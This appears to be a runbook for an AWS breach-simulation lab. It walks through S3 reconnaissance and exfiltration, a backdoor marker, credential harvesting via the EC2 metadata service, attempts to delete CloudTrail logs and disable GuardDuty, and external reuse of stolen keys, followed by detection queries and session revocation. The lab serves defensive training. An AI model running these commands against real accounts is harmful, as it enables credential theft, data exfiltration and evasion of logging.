# Attack Simulation Runbook

Run these commands from inside an SSM session on the EC2 instance.  
**Prerequisites:** Overpermissive IAM policy must be active (see `attack_simulation.tf`).

---

## Connect to EC2

```bash
aws ssm start-session --target <ec2-instance-id>
```

---

## Phase 1 — Reconnaissance

```bash
# Enumerate all buckets in the account
aws s3 ls

# List sensitive bucket contents
aws s3 ls s3://breach-lab-sensitive-<suffix>/
# Expected: AccessDenied

# List data bucket contents
aws s3 ls s3://breach-lab-data-<suffix>/
# Expected: Success
```

---

## Phase 2 — Data Exfiltration

```bash
# Try to pull credential file from sensitive bucket
aws s3 cp s3://breach-lab-sensitive-<suffix>/credentials/db-password.txt /tmp/stolen.txt
# Expected: AccessDenied

# Exfiltrate from data bucket (succeeds)
aws s3 cp s3://breach-lab-data-<suffix>/testfile.txt /tmp/exfiltrated.txt
cat /tmp/exfiltrated.txt

# Write backdoor marker
echo "attacker was here" > /tmp/backdoor.txt
aws s3 cp /tmp/backdoor.txt s3://breach-lab-data-<suffix>/backdoor.txt
# Expected: Success
```

---

## Phase 3 — Credential Harvest via IMDS

```bash
# IMDSv2 — get token first
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Get role name
ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/)

echo "Role: $ROLE"

# Get temporary credentials
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
# Returns: AccessKeyId, SecretAccessKey, Token, Expiration
```

---

## Phase 4 — Cover Tracks (all blocked)

```bash
# Try to delete CloudTrail logs
aws s3 rm s3://breach-lab-logs-<suffix>/ --recursive
# Expected: AccessDenied on every object

# Try to stop CloudTrail
aws cloudtrail stop-logging --name breach-lab-trail
# Expected: AccessDenied

# Try to disable GuardDuty
aws guardduty delete-detector --detector-id <detector-id>
# Expected: AccessDenied
```

---

## Phase 5 — Verify IMDSv2 Enforcement

```bash
# IMDSv1 — must fail
curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/
# Expected: no response or 401

# IMDSv2 — must succeed
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Expected: role name returned
```

---

## Investigation — CloudTrail Queries (run from local machine)

```bash
# Full event chain from EC2 role
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=Username,AttributeValue=breach-lab-ec2-role \
  --start-time $(date -u -d '2 hours ago' '+%Y-%m-%dT%H:%M:%SZ' 2>/dev/null || \
                date -u -v-2H '+%Y-%m-%dT%H:%M:%SZ') \
  --query 'Events[*].{Time:EventTime, Event:EventName}' \
  --output table

# Check GuardDuty findings
DETECTOR_ID=$(aws guardduty list-detectors --query 'DetectorIds[0]' --output text)
aws guardduty list-findings --detector-id $DETECTOR_ID --output table

# Read raw log file (has error codes the API strips out)
aws s3 ls s3://breach-lab-logs-<suffix>/cloudtrail/ --recursive | tail -5
aws s3 cp s3://breach-lab-logs-<suffix>/cloudtrail/AWSLogs/<account>/.../file.json.gz /tmp/trail.json.gz
gunzip /tmp/trail.json.gz
cat /tmp/trail.json | python3 -m json.tool | grep -A 20 '"errorCode": "AccessDenied"'
```

---

## Cleanup After Simulation

```bash
# Remove attacker artifact
aws s3 rm s3://breach-lab-data-<suffix>/backdoor.txt

# Re-enable least privilege IAM:
# 1. Comment out the block in attack_simulation.tf
# 2. Uncomment aws_iam_policy.ec2_s3_policy in main.tf
# 3. Run: terraform apply
```

---

## Phase 6 — External Credential Use (Simulated)

> This phase documents what happens after IMDS credentials are
> harvested and used from an external machine. Simulated based
> on known CloudTrail behavior — not executed due to lab teardown.

### What the attacker does

After harvesting credentials from Phase 3, an attacker copies
the three values (AccessKeyId, SecretAccessKey, Token) to their
own machine and runs:
```bash
# Set stolen credentials as environment variables
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="IQoJ..."

# Confirm identity — still shows EC2 role ARN
aws sts get-caller-identity

# Enumerate buckets from external IP
aws s3 ls

# Exfiltrate from data bucket
aws s3 cp s3://breach-lab-data-<suffix>/testfile.txt ./stolen.txt
```

### What CloudTrail would show

Two events from the same IAM role ARN but different source IPs:

| Event | Source IP | Meaning |
|-------|-----------|---------|
| Actions inside EC2 | 18.x.x.x (AWS internal) | Normal instance activity |
| Actions from laptop | your.home.ip | Credential exfiltration confirmed |

The source IP change on the same role ARN is the primary
detection signal. Same identity, different location — that
is the anomaly.

### How to detect it
```bash
# Filter CloudTrail for the EC2 role
aws cloudtrail lookup-events \
  --lookup-attributes \
  AttributeKey=Username,AttributeValue=breach-lab-ec2-role \
  --query 'Events[*].{Time:EventTime,Event:EventName}' \
  --output table

# In raw log files, look for sourceIPAddress changes
cat trail.json | python3 -m json.tool | grep sourceIPAddress
```

### How to respond (credential revocation)

Once external use is confirmed via source IP change, revoke
all active sessions immediately without rotating the role:
```bash
aws iam put-role-policy \
  --role-name breach-lab-ec2-role \
  --policy-name RevokeAllSessions \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Deny",
      "Action": "*",
      "Resource": "*",
      "Condition": {
        "DateLessThan": {
          "aws:TokenIssueTime": "<timestamp-of-compromise>"
        }
      }
    }]
  }'
```

This invalidates all tokens issued before the compromise
timestamp. The role itself is untouched — only active
sessions are killed.
